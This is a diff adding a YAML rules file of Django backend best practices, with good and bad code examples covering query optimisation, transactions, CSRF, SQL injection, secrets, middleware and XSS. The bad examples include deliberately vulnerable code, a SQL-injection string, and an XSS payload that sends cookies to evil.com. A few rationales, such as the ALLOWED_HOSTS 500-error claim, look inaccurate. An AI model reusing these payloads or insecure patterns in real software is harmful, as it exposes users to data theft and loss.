@@ -1,0 +1,546 @@
+layer: rules
+technology: Django
+domain: backend
+knowledge:
+- id: CR-DJG-001
+  text: Always use select_related() for ForeignKey / OneToOneField and prefetch_related() for ManyToManyField / reverse ForeignKey
+    to prevent N+1 query explosions.
+  why: Each access to a related object without prefetching triggers a separate SQL query. A queryset of 100 objects with 2
+    FK fields produces 201 queries instead of 3, causing exponential latency growth and database connection exhaustion under
+    load.
+  how_to_do_right: '1. Profile with django-debug-toolbar or django-silk to find N+1 hotspots.
+
+    2. Add select_related(''fk_field'') for single-valued relationships (FK, OneToOne).
+
+    3. Add prefetch_related(''m2m_field'', ''reverse_fk_set'') for multi-valued relationships.
+
+    4. Use Prefetch() objects when you need filtered or annotated prefetches.
+
+    5. Create custom QuerySet managers that encapsulate the optimal fetch strategy.
+
+    '
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [django]
+    platform: [postgresql, mysql]
+  domains:
+    domain: [architecture, performance]
+    concern: [backend]
+  example_good: "# Correct: 3 queries total regardless of queryset size\nclass OrderQuerySet(models.QuerySet):\n    def with_details(self):\n\
+    \        return self.select_related(\n            'customer', 'shipping_address'\n        ).prefetch_related(\n      \
+    \      Prefetch(\n                'items',\n                queryset=OrderItem.objects.select_related('product')\n   \
+    \         )\n        )\n\n# Usage\norders = Order.objects.with_details().filter(status='pending')\nfor order in orders:\n\
+    \    print(order.customer.name)        # No extra query\n    for item in order.items.all():     # No extra query\n   \
+    \     print(item.product.name)       # No extra query\n"
+  example_bad: "# Wrong: N+1 queries — 1 + N + N*M queries\norders = Order.objects.filter(status='pending')\nfor order in\
+    \ orders:\n    print(order.customer.name)          # +1 query per order\n    for item in order.items.all():      # +1\
+    \ query per order\n        print(item.product.name)        # +1 query per item\n"
+  when_applies: Any project using Django projects, PostgreSQL databases, or MySQL/MariaDB databases
+  when_not_applies: low-traffic internal tools, admin dashboards, or batch jobs where latency is irrelevant
+  sources: ["https://docs.djangoproject.com/en/5.1/ref/models/querysets/#select-related"]
+- id: CR-DJG-002
+  text: Encapsulate common query patterns in custom managers and QuerySet classes, not in views or serializers.
+  why: Scattered query logic across views leads to duplicated filters, missed optimizations, and inconsistent business rules.
+    When a filter condition changes, every call site must be found and updated — a guaranteed source of bugs.
+  how_to_do_right: '1. Create a custom QuerySet class with chainable methods for common filters.
+
+    2. Assign it via objects = MyQuerySet.as_manager() on the model.
+
+    3. Name methods after business concepts, not SQL operations.
+
+    4. Include select_related/prefetch_related inside the manager method.
+
+    5. Views should chain manager methods, never write raw filter() chains.
+
+    '
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [django]
+  domains:
+    domain: [architecture]
+    concern: [backend]
+  example_good: "class ArticleQuerySet(models.QuerySet):\n    def published(self):\n        return self.filter(\n        \
+    \    status='published',\n            published_at__lte=timezone.now()\n        )\n\n    def by_author(self, author):\n\
+    \        return self.filter(author=author)\n\n    def with_engagement(self):\n        return self.annotate(\n        \
+    \    comment_count=Count('comments'),\n            like_count=Count('likes'),\n        ).select_related('author', 'category')\n\
+    \nclass Article(models.Model):\n    objects = ArticleQuerySet.as_manager()\n\n# View: clean, composable, and optimized\n\
+    articles = Article.objects.published().by_author(user).with_engagement()\n"
+  example_bad: "# Wrong: query logic scattered in views\n# views.py\ndef list_articles(request):\n    articles = Article.objects.filter(\n\
+    \        status='published',\n        published_at__lte=timezone.now(),\n        author=request.user,\n    ).annotate(\n\
+    \        comment_count=Count('comments')\n    ).select_related('author')\n    # Same filter duplicated in 5 other views...\n"
+  when_applies: Projects using Django projects
+  when_not_applies: small scripts under 100 lines, single-purpose utilities. projects not using Django
+  sources: ["https://docs.djangoproject.com/en/5.1/topics/db/managers/"]
+- id: CR-DJG-003
+  text: Use Django signals only for decoupled, cross-app side effects — never for core business logic.
+  why: Signals create invisible coupling that makes control flow impossible to trace. Business logic hidden in signals cannot
+    be tested in isolation, runs in unpredictable order, silently fails without raising exceptions to the caller, and turns
+    debugging into archaeology.
+  how_to_do_right: '1. Use signals only for truly decoupled concerns: cache invalidation, audit logging, search index updates.
+
+    2. For business logic, use explicit service functions or model methods.
+
+    3. If a signal handler has business-critical logic, extract it into a service and call the service directly.
+
+    4. Always use dispatch_uid to prevent duplicate signal connections.
+
+    5. Keep signal handlers under 10 lines — if longer, it is business logic.
+
+    '
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [django]
+  domains:
+    domain: [architecture]
+    concern: [backend]
+  example_good: "# Correct: Signal for decoupled side effect (audit log)\n@receiver(post_save, sender=Order, dispatch_uid=\"\
+    order_audit_log\")\ndef log_order_change(sender, instance, created, **kwargs):\n    AuditLog.objects.create(\n       \
+    \ model='Order', object_id=instance.pk,\n        action='created' if created else 'updated'\n    )\n\n# Business logic\
+    \ in explicit service\nclass OrderService:\n    @staticmethod\n    def place_order(cart, user):\n        with transaction.atomic():\n\
+    \            order = Order.objects.create(user=user, total=cart.total)\n            for item in cart.items.all():\n  \
+    \              OrderItem.objects.create(order=order, product=item.product)\n            InventoryService.reserve(order)\n\
+    \            PaymentService.charge(user, order.total)\n        return order\n"
+  example_bad: "# Wrong: Business logic hidden in signal — untestable, untrackable\n@receiver(post_save, sender=Order)\ndef\
+    \ handle_order_created(sender, instance, created, **kwargs):\n    if created:\n        # Business logic buried in signal\n\
+    \        for item in instance.items.all():\n            item.product.stock -= item.quantity\n            item.product.save()\n\
+    \        send_confirmation_email(instance)\n        charge_payment(instance)  # Payment in a signal?!\n"
+  when_applies: Projects using Django projects
+  when_not_applies: small scripts under 100 lines, single-purpose utilities. projects not using Django
+  sources: ["https://docs.djangoproject.com/en/5.1/topics/signals/"]
+- id: CR-DJG-004
+  text: Never manually edit auto-generated migration files. Use RunPython and RunSQL for data migrations in separate migration
+    files.
+  why: Editing auto-generated migrations creates merge conflicts, breaks migration squashing, and makes rollbacks impossible.
+    A corrupted migration chain can leave production databases in an irrecoverable state where you cannot migrate forward
+    or backward.
+  how_to_do_right: '1. Let makemigrations generate schema migrations automatically.
+
+    2. Create separate data migrations with: python manage.py makemigrations --empty app_name.
+
+    3. Use RunPython with both forward and reverse functions.
+
+    4. Test migrations against a production-like database copy before deploying.
+
+    5. Squash old migrations periodically: python manage.py squashmigrations app_name 0001 0050.
+
+    '
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [django]
+    platform: [postgresql]
+  domains:
+    domain: [architecture]
+    concern: [backend, data, database]
+  example_good: "# Correct: Separate data migration file\n# 0003_populate_default_categories.py\nfrom django.db import migrations\n\
+    \ndef create_defaults(apps, schema_editor):\n    Category = apps.get_model('catalog', 'Category')\n    for name in ['Electronics',\
+    \ 'Books', 'Clothing']:\n        Category.objects.get_or_create(name=name, defaults={'slug': name.lower()})\n\ndef remove_defaults(apps,\
+    \ schema_editor):\n    Category = apps.get_model('catalog', 'Category')\n    Category.objects.filter(name__in=['Electronics',\
+    \ 'Books', 'Clothing']).delete()\n\nclass Migration(migrations.Migration):\n    dependencies = [('catalog', '0002_category_slug')]\n\
+    \    operations = [\n        migrations.RunPython(create_defaults, remove_defaults),\n    ]\n"
+  example_bad: "# Wrong: Manually editing auto-generated migration\n# 0002_auto_20260101_1200.py (auto-generated, then hand-edited)\n\
+    class Migration(migrations.Migration):\n    operations = [\n        migrations.AddField(model_name='category', name='slug',\
+    \ ...),\n        # Hand-added data migration in schema migration — breaks squash\n        migrations.RunPython(lambda\
+    \ apps, se: [\n            apps.get_model('catalog', 'Category').objects.create(name='Default')\n        ]),\n    ]\n"
+  when_applies: Any project using Django projects or PostgreSQL databases
+  when_not_applies: stateless microservices with no data persistence, pure computation modules. projects not using Django
+    or PostgreSQL
+  sources: ["https://docs.djangoproject.com/en/5.1/topics/migrations/"]
+- id: CR-DJG-005
+  text: Wrap multi-step write operations in transaction.atomic() and use select_for_update() for concurrent row access.
+  why: Without explicit transactions, a crash between two related writes leaves the database in an inconsistent state. Without
+    select_for_update, two concurrent requests can read the same balance, both subtract, and produce a negative balance —
+    a classic race condition that costs real money.
+  how_to_do_right: '1. Wrap related writes in transaction.atomic() context manager.
+
+    2. Use select_for_update() on rows that will be read-then-written concurrently.
+
+    3. Keep transactions short — no HTTP calls or file I/O inside atomic blocks.
+
+    4. Use select_for_update(skip_locked=True) for queue-like patterns.
+
+    5. Handle IntegrityError explicitly for unique constraint violations.
+
+    '
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [django]
+    platform: [postgresql]
+  domains:
+    domain: [architecture, performance]
+    concern: [backend, data, database, concurrency]
+  example_good: "from django.db import transaction\n\ndef transfer_funds(from_account_id, to_account_id, amount):\n    with\
+    \ transaction.atomic():\n        # Lock both rows to prevent concurrent modifications\n        accounts = (\n        \
+    \    Account.objects\n            .filter(pk__in=[from_account_id, to_account_id])\n            .select_for_update()\n\
+    \            .order_by('pk')  # Consistent lock ordering prevents deadlocks\n        )\n        account_map = {a.pk: a\
+    \ for a in accounts}\n        source = account_map[from_account_id]\n        dest = account_map[to_account_id]\n\n   \
+    \     if source.balance < amount:\n            raise InsufficientFunds(f\"Balance {source.balance} < {amount}\")\n\n \
+    \       source.balance -= amount\n        dest.balance += amount\n        source.save(update_fields=['balance'])\n   \
+    \     dest.save(update_fields=['balance'])\n        TransferLog.objects.create(\n            source=source, dest=dest,\
+    \ amount=amount\n        )\n"
+  example_bad: "# Wrong: No transaction, no locking — race condition\ndef transfer_funds(from_id, to_id, amount):\n    source\
+    \ = Account.objects.get(pk=from_id)\n    dest = Account.objects.get(pk=to_id)\n    # Two concurrent requests read balance=100,\
+    \ both subtract 80\n    # Result: balance=-60 instead of raising InsufficientFunds\n    source.balance -= amount\n   \
+    \ source.save()  # If crash here, money vanishes\n    dest.balance += amount\n    dest.save()\n"
+  when_applies: Any project using Django projects or PostgreSQL databases
+  when_not_applies: stateless microservices with no data persistence, pure computation modules. projects not using Django
+    or PostgreSQL
+  sources: ["https://docs.djangoproject.com/en/5.1/topics/db/transactions/"]
+- id: CR-DJG-006
+  text: Never disable CSRF middleware. Use {% csrf_token %} in all POST forms and configure CSRF_TRUSTED_ORIGINS for cross-origin
+    requests.
+  why: CSRF attacks allow malicious sites to make authenticated requests using the victim's session cookies. Disabling CSRF
+    protection means any website the user visits can transfer funds, change passwords, or delete data while the user is logged
+    in to your application.
+  how_to_do_right: '1. Keep django.middleware.csrf.CsrfViewMiddleware in MIDDLEWARE (enabled by default).
+
+    2. Include {% csrf_token %} in every POST/PUT/DELETE form.
+
+    3. For AJAX, read the csrftoken cookie and send it as X-CSRFToken header.
+
+    4. Set CSRF_TRUSTED_ORIGINS for cross-origin API consumers.
+
+    5. Use @csrf_exempt only on webhook endpoints that use signature verification instead.
+
+    '
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [django]
+  domains:
+    domain: [architecture, security]
+    concern: [backend]
+  example_good: "# Template: CSRF token in form\n<form method=\"post\" action=\"{% url 'transfer' %}\">\n    {% csrf_token\
+    \ %}\n    <input name=\"amount\" type=\"number\">\n    <button type=\"submit\">Transfer</button>\n</form>\n\n# AJAX: Include\
+    \ CSRF token in header\n// JavaScript\nconst csrftoken = document.querySelector('[name=csrfmiddlewaretoken]').value;\n\
+    fetch('/api/transfer/', {\n    method: 'POST',\n    headers: {\n        'X-CSRFToken': csrftoken,\n        'Content-Type':\
+    \ 'application/json',\n    },\n    body: JSON.stringify({ amount: 100 }),\n});\n\n# settings.py\nCSRF_TRUSTED_ORIGINS\
+    \ = ['https://app.example.com']\n"
+  example_bad: "# Wrong: Disabling CSRF globally\nMIDDLEWARE = [\n    # 'django.middleware.csrf.CsrfViewMiddleware',  # REMOVED\
+    \ — disaster\n]\n\n# Wrong: Blanket exemption on sensitive view\n@csrf_exempt\ndef transfer_money(request):\n    # Any\
+    \ website can now call this with the user's session\n    amount = request.POST['amount']\n    do_transfer(request.user,\
+    \ amount)\n"
+  when_applies: Any project using Django projects
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using Django
+  sources: ["https://docs.djangoproject.com/en/5.1/ref/csrf/"]
+- id: CR-DJG-007
+  text: Never use raw SQL with string formatting or f-strings for user input. Always use parameterized queries or the ORM.
+  why: 'SQL injection is consistently ranked the #1 web vulnerability. A single unparameterized query can allow an attacker
+    to dump the entire database, modify records, or execute operating system commands via database extensions. Django''s ORM
+    is safe by default — raw SQL bypasses all protections.'
+  how_to_do_right: '1. Use Django ORM methods (filter, exclude, annotate) for all standard queries.
+
+    2. If raw SQL is unavoidable, ALWAYS use parameterized placeholders (%s).
+
+    3. Never use f-strings, .format(), or % string formatting with user input in SQL.
+
+    4. Use extra() and RawSQL() with params argument, never inline values.
+
+    5. Audit all raw() and cursor.execute() calls in code review.
+
+    '
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [django]
+    platform: [postgresql, mysql]
+  domains:
+    domain: [architecture, security]
+    concern: [backend]
+  example_good: "# Correct: Parameterized raw query\nfrom django.db import connection\n\ndef search_users(query_text):\n \
+    \   with connection.cursor() as cursor:\n        cursor.execute(\n            \"SELECT id, name FROM users WHERE name\
+    \ ILIKE %s\",\n            [f'%{query_text}%']  # Parameter — safely escaped\n        )\n        return cursor.fetchall()\n\
+    \n# Better: Use ORM\ndef search_users(query_text):\n    return User.objects.filter(name__icontains=query_text)\n\n# Also\
+    \ correct: RawSQL with params\nfrom django.db.models.expressions import RawSQL\nUser.objects.annotate(\n    custom_score=RawSQL(\"\
+    score * %s\", [multiplier])\n)\n"
+  example_bad: "# CRITICAL VULNERABILITY: SQL injection\ndef search_users(query_text):\n    with connection.cursor() as cursor:\n\
+    \        # Attacker sends: ' OR 1=1; DROP TABLE users; --\n        cursor.execute(\n            f\"SELECT * FROM users\
+    \ WHERE name LIKE '%{query_text}%'\"\n        )\n        return cursor.fetchall()\n"
+  when_applies: Any project using Django projects, PostgreSQL databases, or MySQL/MariaDB databases
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
+  sources: ["https://docs.djangoproject.com/en/5.1/topics/security/#sql-injection-protection"]
+- id: CR-DJG-008
+  text: Always load SECRET_KEY and sensitive settings from environment variables or a secrets manager — never hardcode in
+    settings.py.
+  why: A hardcoded SECRET_KEY committed to version control allows anyone with repo access to forge session cookies, CSRF tokens,
+    and password reset links. If the repo is public or compromised, every user session can be hijacked and every signed cookie
+    forged.
+  how_to_do_right: '1. Store SECRET_KEY in environment variable or .env file (never committed).
+
+    2. Use django-environ or python-decouple to load from .env.
+
+    3. Set ALLOWED_HOSTS explicitly — never use [''*''] in production.
+
+    4. Use different SECRET_KEY values per environment.
+
+    5. Rotate SECRET_KEY periodically and invalidate old sessions.
+
+    '
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [django]
+  domains:
+    domain: [architecture, security, operations, deployment]
+    concern: [backend]
+  example_good: "# settings.py\nimport environ\n\nenv = environ.Env()\nenviron.Env.read_env('.env')\n\nSECRET_KEY = env('DJANGO_SECRET_KEY')\n\
+    DEBUG = env.bool('DJANGO_DEBUG', default=False)\nALLOWED_HOSTS = env.list('DJANGO_ALLOWED_HOSTS', default=[])\n\nDATABASES\
+    \ = {\n    'default': env.db('DATABASE_URL')\n}\n\n# .env (NEVER committed — in .gitignore)\nDJANGO_SECRET_KEY=your-50-char-random-string-here\n\
+    DJANGO_DEBUG=false\nDJANGO_ALLOWED_HOSTS=app.example.com,www.example.com\nDATABASE_URL=postgres://user:pass@db:5432/mydb\n"
+  example_bad: "# WRONG: Hardcoded secrets in version control\nSECRET_KEY = 'django-insecure-abc123-this-is-public-now'\n\
+    DEBUG = True  # Left True in production\nALLOWED_HOSTS = ['*']  # Any domain can be used for host header attacks\n\nDATABASES\
+    \ = {\n    'default': {\n        'PASSWORD': 'production_password_here',  # In git history forever\n    }\n}\n"
+  when_applies: Any project using Django projects
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using Django
+  sources: ["https://docs.djangoproject.com/en/5.1/howto/deployment/checklist/"]
+- id: CR-DJG-009
+  text: Use class-based views for standard CRUD operations and function-based views for custom non-CRUD logic.
+  why: CBVs provide battle-tested implementations for common patterns (list, detail, create, update, delete) with proper HTTP
+    method handling, pagination, and permissions built in. Using FBVs for CRUD leads to reimplementing these patterns incorrectly.
+    Conversely, forcing complex custom logic into CBV inheritance hierarchies creates unreadable mixin chains.
+  how_to_do_right: '1. Use ListView, DetailView, CreateView, UpdateView, DeleteView for CRUD.
+
+    2. Use @api_view or plain function views for custom business operations.
+
+    3. Override only the methods you need in CBVs (get_queryset, get_context_data).
+
+    4. Limit mixin depth to 2 levels — if deeper, switch to FBV.
+
+    5. For DRF: ModelViewSet for full CRUD, @action for custom endpoints.
+
+    '
+  severity: medium
+  technologies:
+    lang: [python]
+    framework: [django, django_rest]
+  domains:
+    domain: [architecture]
+    concern: [backend]
+  example_good: "# CBV for standard CRUD — leverages built-in pagination, permissions\nclass ArticleListView(LoginRequiredMixin,\
+    \ ListView):\n    model = Article\n    queryset = Article.objects.published().with_engagement()\n    paginate_by = 25\n\
+    \    template_name = 'articles/list.html'\n\n# FBV for custom business logic — clearer control flow\n@login_required\n\
+    def merge_duplicate_articles(request):\n    if request.method != 'POST':\n        return HttpResponseNotAllowed(['POST'])\n\
+    \    source_id = request.POST['source_id']\n    target_id = request.POST['target_id']\n    result = ArticleService.merge(source_id,\
+    \ target_id, request.user)\n    messages.success(request, f'Merged {result.redirects_created} links')\n    return redirect('article-detail',\
+    \ pk=target_id)\n"
+  example_bad: "# Wrong: Reimplementing ListView from scratch\n@login_required\ndef article_list(request):\n    page = int(request.GET.get('page',\
+    \ 1))\n    per_page = 25\n    articles = Article.objects.filter(status='published')\n    # Manual pagination — error-prone,\
+    \ no edge case handling\n    start = (page - 1) * per_page\n    articles = articles[start:start + per_page]\n    return\
+    \ render(request, 'articles/list.html', {'articles': articles})\n"
+  when_applies: Projects using Django projects or Django REST Framework
+  when_not_applies: small scripts under 100 lines, single-purpose utilities. projects not using Django or Django REST Framework
+  sources: ["https://docs.djangoproject.com/en/5.1/topics/class-based-views/"]
+- id: CR-DJG-010
+  text: Middleware order in MIDDLEWARE setting is execution order — security middleware must come before application middleware.
+  why: Django processes middleware top-to-bottom on request and bottom-to-top on response. Placing SecurityMiddleware after
+    SessionMiddleware means security headers are set before session data is available. Placing authentication after your view
+    middleware means views execute without user context. Wrong order silently breaks security and causes mysterious bugs.
+  how_to_do_right: '1. SecurityMiddleware first (HTTPS redirect, HSTS headers).
+
+    2. SessionMiddleware before AuthenticationMiddleware.
+
+    3. AuthenticationMiddleware before any middleware that uses request.user.
+
+    4. CsrfViewMiddleware after SessionMiddleware but before views.
+
+    5. Custom middleware goes after Django''s built-in middleware.
+
+    '
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [django]
+  domains:
+    domain: [architecture, security]
+    concern: [backend]
+  example_good: "# settings.py — correct order\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',     \
+    \ # 1. Security headers\n    'whitenoise.middleware.WhiteNoiseMiddleware',          # 2. Static files\n    'django.contrib.sessions.middleware.SessionMiddleware',#\
+    \ 3. Sessions\n    'django.middleware.common.CommonMiddleware',           # 4. URL normalization\n    'django.middleware.csrf.CsrfViewMiddleware',\
+    \          # 5. CSRF (needs session)\n    'django.contrib.auth.middleware.AuthenticationMiddleware',  # 6. Auth (needs\
+    \ session)\n    'django.contrib.messages.middleware.MessageMiddleware',     # 7. Messages (needs session)\n    'myapp.middleware.AuditLogMiddleware',\
+    \                 # 8. Custom (needs auth)\n]\n"
+  example_bad: "# Wrong: broken order\nMIDDLEWARE = [\n    'myapp.middleware.AuditLogMiddleware',   # Uses request.user —\
+    \ not set yet!\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n\
+    \    'django.contrib.sessions.middleware.SessionMiddleware',  # Session after CSRF?!\n    'django.middleware.security.SecurityMiddleware',\
+    \  # Security last?!\n]\n"
+  when_applies: Projects using Django projects
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using Django
+  sources: ["https://docs.djangoproject.com/en/5.1/topics/http/middleware/"]
+- id: CR-DJG-011
+  text: Configure Gunicorn with workers = (2 x CPU cores) + 1 and use connection pooling (pgbouncer) for production deployments.
+  why: A single Gunicorn worker handles one request at a time. With default 1 worker, your production server processes requests
+    sequentially — a single slow database query blocks all users. Without connection pooling, each worker opens its own database
+    connection, leading to connection exhaustion at scale (4 workers x 10 threads = 40 connections per server).
+  how_to_do_right: '1. Set workers = (2 x CPU) + 1 for CPU-bound; use threads for I/O-bound.
+
+    2. Use pgbouncer in transaction mode between Gunicorn and PostgreSQL.
+
+    3. Set CONN_MAX_AGE=0 when using pgbouncer (pgbouncer manages pooling).
+
+    4. Configure max_requests to recycle workers and prevent memory leaks.
+
+    5. For async views, use uvicorn workers with Gunicorn: -k uvicorn.workers.UvicornWorker.
+
+    '
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [django, gunicorn]
+    library: [pgbouncer]
+    platform: [postgresql]
+  domains:
+    domain: [architecture, operations, deployment, performance]
+    concern: [backend]
+  example_good: "# gunicorn.conf.py\nimport multiprocessing\n\nbind = \"0.0.0.0:8000\"\nworkers = multiprocessing.cpu_count()\
+    \ * 2 + 1\nworker_class = \"gthread\"\nthreads = 4\nmax_requests = 1000\nmax_requests_jitter = 50\ntimeout = 30\nkeepalive\
+    \ = 5\naccesslog = \"-\"\nerrorlog = \"-\"\n\n# settings.py — with pgbouncer\nDATABASES = {\n    'default': {\n      \
+    \  'ENGINE': 'django.db.backends.postgresql',\n        'HOST': 'pgbouncer',  # Point to pgbouncer, not direct DB\n   \
+    \     'PORT': '6432',\n        'CONN_MAX_AGE': 0,    # Let pgbouncer manage connections\n    }\n}\n"
+  example_bad: "# Wrong: Default single worker, no pooling\n# Command: gunicorn myapp.wsgi\n# = 1 worker, 1 request at a time,\
+    \ direct DB connections\n\n# settings.py\nDATABASES = {\n    'default': {\n        'HOST': 'db-primary',\n        'PORT':\
+    \ '5432',\n        'CONN_MAX_AGE': 600,  # Holds connections open for 10 min per worker\n    }\n}\n# 8 workers x 600s\
+    \ CONN_MAX_AGE = connections never released\n"
+  when_applies: Projects using Django projects, Gunicorn, PostgreSQL databases, or pgbouncer
+  sources: ["https://docs.gunicorn.org/en/stable/design.html"]
+- id: CR-DJG-012
+  text: Use collectstatic with WhiteNoise or a CDN for static files — never serve static files through Django in production.
+  why: Django's built-in static file serving is single-threaded, has no caching headers, no compression, and no CDN integration.
+    Every static file request (CSS, JS, images) ties up an application worker that should be processing dynamic requests.
+    Under load, static file requests starve the application.
+  how_to_do_right: '1. Install whitenoise and add WhiteNoiseMiddleware after SecurityMiddleware.
+
+    2. Run collectstatic during deployment (CI/CD pipeline).
+
+    3. Enable compression and caching: STATICFILES_STORAGE = ''whitenoise.storage.CompressedManifestStaticFilesStorage''.
+
+    4. For high traffic: use a CDN (CloudFront, Cloudflare) with STATIC_URL pointing to CDN.
+
+    5. Never set DEBUG=True in production (it enables Django''s static serving).
+
+    '
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [django]
+    library: [whitenoise]
+  domains:
+    domain: [architecture, operations, deployment, performance]
+    concern: [backend]
+  example_good: "# settings.py\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'whitenoise.middleware.WhiteNoiseMiddleware',\
+    \  # Right after security\n    # ...\n]\n\nSTATIC_URL = '/static/'\nSTATIC_ROOT = BASE_DIR / 'staticfiles'\nSTORAGES =\
+    \ {\n    'staticfiles': {\n        'BACKEND': 'whitenoise.storage.CompressedManifestStaticFilesStorage',\n    },\n}\n\n\
+    # Dockerfile\n# RUN python manage.py collectstatic --noinput\n\n# With CDN:\n# STATIC_URL = 'https://cdn.example.com/static/'\n"
+  example_bad: "# Wrong: Serving static files through Django in production\n# urls.py\nfrom django.conf import settings\n\
+    from django.conf.urls.static import static\n\nurlpatterns = [\n    # ...\n] + static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\
+    # This only works with DEBUG=True — and DEBUG=True in production\n# exposes full tracebacks, settings, and SQL queries\
+    \ to attackers\n"
+  when_applies: Projects using Django projects or WhiteNoise
+  when_not_applies: projects not using Django or WhiteNoise
+  sources: ["https://docs.djangoproject.com/en/5.1/howto/static-files/deployment/"]
+- id: CR-DJG-013
+  text: Django templates auto-escape HTML by default. Never use |safe or mark_safe() on user-supplied content.
+  why: Django's template engine automatically escapes HTML special characters (<, >, &, quotes) preventing XSS. Using |safe
+    or mark_safe() on user input tells Django to skip escaping, allowing attackers to inject arbitrary JavaScript that steals
+    cookies, redirects users, or hijacks sessions.
+  how_to_do_right: '1. Trust Django''s auto-escaping — it handles {{ variable }} safely by default.
+
+    2. Only use |safe or mark_safe() on content YOU generated (not user input).
+
+    3. For rich text from users, use a sanitizer like bleach or nh3 before storing.
+
+    4. Use Content-Security-Policy headers to prevent inline script execution.
+
+    5. Audit all uses of |safe and mark_safe in templates and code.
+
+    '
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [django]
+  domains:
+    domain: [architecture, security]
+    concern: [backend, frontend]
+  example_good: "# Template: auto-escaped by default\n<h1>{{ article.title }}</h1>  {# Safe: <script> becomes &lt;script&gt;\
+    \ #}\n\n# If you need rich HTML, sanitize at write time\nimport nh3\n\ndef save_article(title, body_html):\n    clean_body\
+    \ = nh3.clean(\n        body_html,\n        tags={'p', 'a', 'strong', 'em', 'ul', 'li'},\n        attributes={'a': {'href'}},\n\
+    \    )\n    Article.objects.create(title=title, body=clean_body)\n\n# Template: safe to use |safe because content was\
+    \ sanitized at write time\n<div class=\"body\">{{ article.body|safe }}</div>\n"
+  example_bad: "# CRITICAL XSS: Rendering unsanitized user input as HTML\n<div class=\"comment\">{{ comment.text|safe }}</div>\n\
+    {# User submits: <script>fetch('https://evil.com?c='+document.cookie)</script> #}\n{# Every visitor's session cookie is\
+    \ now stolen #}\n\n# Also wrong: mark_safe on user content in Python\nfrom django.utils.safestring import mark_safe\n\
+    def render_username(user):\n    return mark_safe(f'<strong>{user.display_name}</strong>')\n    # display_name = '<img\
+    \ src=x onerror=alert(1)>'\n"
+  when_applies: Any project using Django projects
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using Django
+  sources: ["https://docs.djangoproject.com/en/5.1/topics/security/#cross-site-scripting-xss-protection"]
+- id: CR-DJG-014
+  text: Always set ALLOWED_HOSTS explicitly in production. Never use ['*'] or leave it empty with DEBUG=False.
+  why: With ALLOWED_HOSTS=['*'], an attacker can use Host header poisoning to generate password reset links pointing to their
+    own domain, poison web caches, and bypass virtual host routing. Django returns 400 for unrecognized hosts only when ALLOWED_HOSTS
+    is properly configured.
+  how_to_do_right: '1. Set ALLOWED_HOSTS to your exact domains: [''example.com'', ''www.example.com''].
+
+    2. Include internal hostnames if using health checks: [''example.com'', ''localhost''].
+
+    3. Load from environment variable for flexibility across environments.
+
+    4. Never use wildcard [''*''] or [''.example.com''] unless you control all subdomains.
+
+    5. Test by sending a request with a forged Host header — it should return 400.
+
+    '
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [django]
+  domains:
+    domain: [architecture, security, operations, deployment]
+    concern: [backend]
+  example_good: '# settings.py
+
+    import environ
+
+    env = environ.Env()
+
+
+    ALLOWED_HOSTS = env.list(''ALLOWED_HOSTS'', default=[''localhost'', ''127.0.0.1''])
+
+
+    # Production .env
+
+    ALLOWED_HOSTS=app.example.com,www.example.com
+
+
+    # Verify with curl:
+
+    # curl -H "Host: evil.com" https://app.example.com/
+
+    # Should return 400 Bad Request
+
+    '
+  example_bad: '# Wrong: Host header attacks possible
+
+    ALLOWED_HOSTS = [''*'']  # Any domain accepted
+
+
+    # Also wrong: Empty with DEBUG=False crashes instead of rejecting
+
+    ALLOWED_HOSTS = []
+
+    DEBUG = False
+
+    # Result: 500 error on every request (not a graceful 400)
+
+    '
+  when_applies: Projects using Django projects
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using Django
+  sources: ["https://docs.djangoproject.com/en/5.1/ref/settings/#allowed-hosts"]
